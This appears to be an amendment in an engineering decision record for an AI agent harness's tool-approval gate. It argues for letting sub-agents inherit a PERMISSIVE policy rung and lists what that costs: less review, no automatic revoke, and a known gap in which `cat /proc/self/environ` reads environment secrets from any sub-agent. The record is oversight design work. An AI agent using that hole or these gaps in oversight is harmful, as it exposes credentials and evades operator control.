`approval.inherits_to_subagents(Policy.PERMISSIVE)` returns True. A sub-agent's calls are
now classified under its session's rung instead of falling back to `STRICT`. **§4 is not
withdrawn** — its conclusion, that spawns keep parking, is unchanged and is what this
amendment rests on.

### §4 answered two questions as one, and only one of them is being reopened

The 09-17 request was that *sub-agent starts stop parking*. §4 declined it and gave four
legs. Legs 2 (`2026-08-22` D2, blast radius is a fan-out) and 3 (`2026-09-03` §8's
containment premise) both argue about auto-approving the **spawn**, and neither is touched
here. Only leg 1, inherited from `2026-08-11` §4, argues about **inheritance**: *"one
approval silently relaxes the gate for an unbounded number of downstream calls."*

Those are separable and §4 does not separate them. A reader taking §4 as one decision will
read this amendment as overturning it. It overturns leg 1 and leaves the heading intact.

### Leg 1 does not describe the tree it is being applied to

Two things it assumes are false as the branch was built:

- **"One approval."** `Task`/`Agent` are in `_REVIEW` under `PERMISSIVE` and were never
  moved out. Every agent costs its own approval, so N agents cost N. Fleet size is
  operator-bounded one decision at a time, under a `subagent_cap` whose deny sits ahead of
  `classify` in `_gate_tool_use` and which no policy can widen.
- **"Unbounded downstream calls."** What is left after the spawn approval is that agent's
  `Bash` traffic, each command re-run through `shellscan` fail-closed. That is the same
  per-call test the root's own traffic gets, which the operator accepted when they set the
  dial.

`inherits_to_subagents`'s previous reasoning drew the line at *a claim about a command
string, not a bound around a process*. Read for how each composes: a per-command verdict is
re-established at every call and so does not weaken with fan-out, while a per-process
sandbox claim needs sub-agents to actually share the parent's process, which is an
empirical fact about CLI topology (`scripts/verify_nested_sandbox.py`). The rung whose
safety is rebuilt from scratch at every call was the one refusing to inherit, and the rung
resting on a probe result was the one inheriting. That ordering had it backwards.

The rule is now pinned rather than argued per rung:
`test_a_rung_that_inherits_bounds_its_fleet_by_approval_or_by_containment` requires every
inheriting rung to park spawns **or** require containment. `PERMISSIVE` takes the first,
`AUTONOMOUS` the second, and a fourth rung has to pick one.

### What this costs, accepted rather than answered

**Unreviewable volume multiplies.** `AUTO_APPROVE` returns before `_park`, so no
`PendingApproval` is ever constructed — §5's point, now applying to every agent in the
fleet rather than to the root alone. The transcript is the only record. `subagent_cap` is
the only bound on it, since the automatic revoke was removed on 2026-09-21 and nothing ends
a relaxed phase but the operator noticing the dial.

**The read reach travels with it.** §12 U11's admitted `cat /proc/self/environ`, which the
CLI's `Read` refuses, is now reachable from every sub-agent rather than from the root only.
`requires_containment(PERMISSIVE)` stays False and flipping it would not close U11 anyway
(the sandbox's read policy covers `/proc`), so this widens who can reach a hole that was
already recorded and already open.

### What is not claimed

**Do not size this off the 09-22 amendment's 81.2% sub-agent admit rate.** That same
amendment disqualifies the figure in the paragraph that reports it: 46 of the 85 files with
a `Bash` call are sub-agent slices, many of them this branch's own agents probing this
branch's own gate, and the corpus therefore *"measures the experiment along with the
subject, in the flattering direction."* Nothing has measured the admit rate for sub-agents
doing ordinary work.

**Nor is this claimed to remove a presence.** The 09-22 amendment answered that question no
for sessions, at 0 of 39 getting through their `Bash` traffic without parking. The same
question for sub-agents is unmeasured, and the honest expectation is the same answer: fewer
and later presences, not none. 08-11's unmeasured assumption that `Bash` is the bulk of the
burst rides along here exactly as it does everywhere else in this record.

**§4's 2026-09-17 revisit trigger is not discharged.** The sandbox landed (`e3a5e7a`,
`b4f3153`, `2853e38`, merged at `5f33e9f`), which is the condition that amendment named —
but it named it for *auto-approving spawns under `AUTONOMOUS`'s premise*, and nobody has
taken that decision. It is still open and this amendment is not it.

### A consequence in the driver, recorded because it is easy to misread

`AgentSession._policy_for`'s narrowing arm is now **unreachable**. `STRICT` is the only rung
that does not inherit, and narrowing `STRICT` to `STRICT` is a no-op, so the function
returns `self._policy` for every rung that exists. It is kept as a branch, and its docstring
now says so: deleting it would move the decision out of the rung property and back into the
driver, making the next non-inheriting rung a driver change instead of an enum one. The
test that pins the `is not None` handling of an empty `agent_id` supplies a non-inheriting
rung by monkeypatch, because there is no longer one on the ladder.

One thing this fixes for free: `store.py`'s child rows inherit the parent's policy
unconditionally, so before this change a sub-agent of a `PERMISSIVE` session displayed
`PERMISSIVE` while the gate applied `STRICT`. The record and the gate now agree, which is
what `test_a_subagent_of_an_under_gated_session_reads_as_under_gated` asserts they must.

### What was verified for this amendment

**Verified by execution this session** (`.venv/bin/python`, 2026-09-24, working tree on
`main` at `5f33e9f` plus uncommitted work that predates this change):

- The full suite: 2545 passed, 1 failed, 6 skipped, 3 xfailed. The failure is
  `test_a_path_the_filesystem_cannot_place_is_refused`, a symlink-loop write-region test
  which **fails identically at `5f33e9f` with this change stashed**. It is pre-existing and
  unrelated, and is not diagnosed here.
- `make typecheck`'s target (`mypy pptmstr`): clean, 45 files.
- `black` over the four edited files.
- That the tree already contained uncommitted modifications to `pptmstr/app.py`,
  `pptmstr/settings.py` and `tests/test_driver.py` before this change. They are untouched by
  it and their purpose was not investigated.

**Not verified by execution:** `mypy` over `tests/` fails and did so before this change —
204 errors at `5f33e9f`, 207 after, the three new ones being the same `dict[str, object]`
hook-input pattern every test in `test_gate.py` already uses. `make typecheck-all` was
already red; this change neither fixes nor worsens that in kind.

**Not run:** no live session has been driven under an inheriting `PERMISSIVE` rung. Every
assertion here is at the level of the gate's verdicts and the classifier's arguments, which
is where the decision was taken. Whether it feels different to operate is the thing the
operator is about to find out, and this record does not predict it.
